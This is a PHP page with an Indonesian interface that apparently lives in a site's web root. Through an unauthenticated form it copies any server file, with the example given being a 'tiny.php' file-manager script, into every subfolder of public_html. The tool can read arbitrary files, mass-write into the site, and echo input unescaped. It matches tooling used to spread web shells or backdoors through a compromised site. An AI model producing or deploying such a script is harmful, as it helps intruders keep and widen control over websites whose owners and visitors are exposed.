<?php
set_time_limit(0);

$targetRoot = '/home/bupacid/public_html';
$sourceFile = isset($_POST['source_file']) ? trim($_POST['source_file']) : '';

function getSubfolders($dir, $maxDepth, $currentDepth = 0) {
    if ($currentDepth > $maxDepth) return [];

    $folders = [$dir];
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            $folders = array_merge($folders, getSubfolders($fullPath, $maxDepth, $currentDepth + 1));
        }
    }
    return $folders;
}

if ($sourceFile) {
    echo "<h3>Copy file <code>$sourceFile</code> ke semua subfolder di <code>$targetRoot</code></h3>";

    if (!file_exists($sourceFile) || !is_file($sourceFile)) {
        echo "<div style='color:red'>File sumber tidak ditemukan atau bukan file!</div>";
    } else {
        $maxDepth = 2; // ubah sesuai kebutuhan
        $allFolders = getSubfolders($targetRoot, $maxDepth);
        $fileName = basename($sourceFile);

        $content = file_get_contents($sourceFile);

        $success = 0;
        $failed = 0;
        foreach ($allFolders as $folder) {
            $dest = $folder . DIRECTORY_SEPARATOR . $fileName;
            if (file_put_contents($dest, $content) !== false) {
                echo "<span style='color:green'>[COPIED]</span> $dest<br>";
                $success++;
            } else {
                echo "<span style='color:red'>[FAILED]</span> $dest<br>";
                $failed++;
            }
            @ob_flush();
            @flush();
        }

        echo "<hr>";
        echo "Berhasil: $success<br>";
        echo "Gagal: $failed<br>";
    }
}
?>

<!DOCTYPE html>
<html>
<head><title>Copy File ke Banyak Folder</title></head>
<body>
<h2>Copy File ke Semua Subfolder</h2>
<form method="POST">
    <label>Masukkan path file sumber lengkap (contoh: /home/bupacid/public_html/cbt/tiny.php):</label><br>
    <input type="text" name="source_file" style="width:400px;" required><br><br>
    <button type="submit">Copy File ke Semua Subfolder</button>
</form>
</body>
</html>
